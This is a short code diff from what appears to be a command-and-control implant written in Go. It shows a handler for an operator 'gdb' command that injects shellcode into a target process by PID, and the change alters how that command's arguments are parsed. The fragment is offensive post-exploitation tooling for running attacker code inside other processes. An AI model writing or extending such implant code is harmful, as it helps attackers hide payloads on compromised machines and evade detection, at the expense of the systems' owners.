@@ -141,14 +141,14 @@ func processCCData(data *MsgTunData) {
 			if cmdSlice[1] == "gdb" {
 				out = "GDB has successfully injected shellcode into target process" +
 					"\nYour shellcode will run before target process exits"
-				if len(cmdSlice) != 4 {
+				if len(cmdSlice) != 3 {
 					goto send
 				}
-				pid, err := strconv.Atoi(cmdSlice[3])
+				pid, err := strconv.Atoi(cmdSlice[2])
 				if err != nil {
 					log.Print("Invalid pid")
 				}
-				err = GDBInjectShellcode(cmdSlice[2], pid)
+				err = GDBInjectShellcode(pid)
 				if err != nil {
 					out = "failed: " + err.Error()
 				}
